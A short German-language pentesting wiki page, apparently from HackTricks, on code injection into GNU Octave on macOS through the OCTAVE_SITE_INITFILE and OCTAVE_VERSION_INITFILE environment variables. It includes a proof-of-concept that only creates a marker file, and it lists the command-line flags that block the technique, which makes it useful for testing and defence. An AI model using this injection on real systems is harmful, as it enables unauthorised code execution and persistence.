# Injection in GNU Octave-Anwendungen unter macOS

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave führt beim Start mehrere Dateien aus, die gültige Octave-Befehle enthalten. `OCTAVE_SITE_INITFILE` überschreibt die systemweite Startup-Datei und `OCTAVE_VERSION_INITFILE` die versionsspezifische Datei. Dadurch kann jede der beiden Variablen die automatische Ausführung auf eine für den Angreifer lesbare Datei umleiten.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` überspringt nur Benutzerdateien wie `~/.octaverc`; es verhindert **nicht** die oben beschriebene Überschreibung durch die Site-Datei. Verwende `--no-site-file` für die Site-Dateien oder `--norc` / `-f`, um alle Startdateien zu deaktivieren.<sup>[[2]](#references)</sup>

## References

- [1] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [2] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
